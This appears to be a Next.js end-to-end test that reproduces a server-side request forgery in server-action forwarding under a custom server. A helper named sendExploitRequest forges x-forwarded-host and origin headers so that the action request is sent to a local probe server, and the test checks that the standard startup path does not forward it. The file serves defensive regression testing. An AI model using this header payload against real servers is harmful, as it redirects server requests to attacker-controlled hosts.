import http from 'http'
import fs from 'fs/promises'
import path from 'path'
import { isNextDev, nextTestSetup, type NextInstance } from 'e2e-utils'
import { findPort, getDistDir, retry } from 'next-test-utils'

type ActionManifestEntry = {
  exportedName?: string
  filename?: string
  workers: Record<string, { moduleId: string | number; async: boolean }>
}

type ProbeRequest = {
  method: string | undefined
  url: string | undefined
  headers: http.IncomingHttpHeaders
  body: string
}

const sharedDeps = { 'get-port': '5.1.1' }
const sharedNodeEnv = isNextDev ? 'development' : 'production'

async function getActionEntry(
  next: NextInstance,
  pageFileSuffix: string
): Promise<[string, ActionManifestEntry]> {
  await next.render('/a')
  await next.render('/b')

  const manifestPath = path.join(
    next.testDir,
    getDistDir(),
    'server',
    'server-reference-manifest.json'
  )
  const manifestContent = await fs.readFile(manifestPath, 'utf8')
  const manifest = JSON.parse(manifestContent)

  const entry = Object.entries<ActionManifestEntry>(manifest.node || {}).find(
    ([, action]) =>
      action.filename?.endsWith(pageFileSuffix) &&
      action.exportedName?.startsWith('$$RSC_SERVER_ACTION_')
  )

  expect(entry).toBeDefined()
  return entry!
}

async function sendExploitRequest(
  next: NextInstance,
  actionId: string,
  probePort: number
) {
  const response = await fetch(`${next.url}/a`, {
    method: 'POST',
    headers: {
      'content-type': 'text/plain;charset=UTF-8',
      'next-action': actionId,
      origin: `http://127.0.0.1:${probePort}`,
      'x-attack-marker': 'custom-server-forward-ssrf',
      'x-forwarded-host': `127.0.0.1:${probePort}`,
      'x-forwarded-proto': 'http',
    },
    body: 'probe-body',
  })

  return {
    status: response.status,
    body: await response.text(),
  }
}

describe('custom-server-action-forward-ssrf', () => {
  let probeServer: http.Server
  let probePort: number
  const probeRequests: ProbeRequest[] = []

  beforeAll(async () => {
    probePort = await findPort()
    probeServer = http.createServer((req, res) => {
      const chunks: Buffer[] = []
      req.on('data', (chunk) => {
        chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk))
      })
      req.on('end', () => {
        probeRequests.push({
          method: req.method,
          url: req.url,
          headers: req.headers,
          body: Buffer.concat(chunks).toString('utf8'),
        })
        res.writeHead(200, { 'content-type': 'text/plain' })
        res.end('probe-hit')
      })
    })

    await new Promise<void>((resolve, reject) => {
      probeServer.listen(probePort, '127.0.0.1', resolve)
      probeServer.once('error', reject)
    })
  })

  afterAll(async () => {
    await new Promise<void>((resolve) => {
      probeServer.close(() => resolve())
    })
  })

  describe('custom server startup path', () => {
    const { next, skipped } = nextTestSetup({
      files: __dirname,
      startCommand: 'node server.js',
      serverReadyPattern: /- Local:/,
      env: {
        NODE_ENV: sharedNodeEnv,
      },
      dependencies: sharedDeps,
      skipDeployment: true,
      disableAutoSkewProtection: true,
    })
    if (skipped) return

    it('forwards the action request to an attacker-controlled host', async () => {
      probeRequests.length = 0

      const [actionId, action] = await getActionEntry(next, 'app/b/page.tsx')

      expect(Object.keys(action.workers)).toContain('app/b/page')
      expect(Object.keys(action.workers)).not.toContain('app/a/page')

      const response = await sendExploitRequest(next, actionId, probePort)

      await retry(async () => {
        expect(probeRequests.length).toBe(1)
      })

      expect(probeRequests[0]).toMatchObject({
        method: 'POST',
        body: 'probe-body',
      })
      expect(probeRequests[0].url).toContain('/b')
      expect(probeRequests[0].headers.host).toBe(`127.0.0.1:${probePort}`)
      expect(probeRequests[0].headers.origin).toBe(
        `http://127.0.0.1:${probePort}`
      )
      expect(probeRequests[0].headers['next-action']).toBe(actionId)
      expect(probeRequests[0].headers['x-action-forwarded']).toBe('1')
      expect(probeRequests[0].headers['x-attack-marker']).toBe(
        'custom-server-forward-ssrf'
      )

      expect(response).toEqual({
        status: 200,
        body: '{}',
      })
    })
  })

  describe('standard next startup path', () => {
    const { next, skipped } = nextTestSetup({
      files: __dirname,
      dependencies: sharedDeps,
      skipDeployment: true,
    })
    if (skipped) return

    it('does not forward the same request off-origin', async () => {
      probeRequests.length = 0

      const [actionId, action] = await getActionEntry(next, 'app/b/page.tsx')

      expect(Object.keys(action.workers)).toContain('app/b/page')
      expect(Object.keys(action.workers)).not.toContain('app/a/page')

      await sendExploitRequest(next, actionId, probePort)

      await new Promise((resolve) => setTimeout(resolve, 500))
      expect(probeRequests).toHaveLength(0)
    })
  })
})
